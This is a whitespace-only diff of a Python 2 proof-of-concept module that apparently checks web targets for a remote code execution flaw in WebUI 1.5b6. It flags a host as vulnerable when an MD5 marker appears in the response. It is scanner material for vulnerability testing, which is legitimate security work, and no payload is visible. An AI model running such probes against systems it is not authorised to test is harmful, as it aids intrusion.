@@ -6,6 +6,7 @@ import re
 import urllib
 import urllib2
 
+
 class Vuln(ABVuln):
     vuln_id = 'WebUI_0006'  # 平台漏洞编号，留空
     name = 'WebUI 远程代码执行漏洞'  # 漏洞名称
@@ -20,6 +21,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'WebUI'  # 漏洞应用名称
     product_version = 'WebUI 1.5b6'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '7c4363c1-ec87-4c23-9a2a-c523f5dd17c2'
@@ -40,14 +42,15 @@ class Poc(ABPoc):
             response = requests.get(vul_url)
             text = response.content
             if '698d51a19d8a121ce581499d7b701668' in text:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
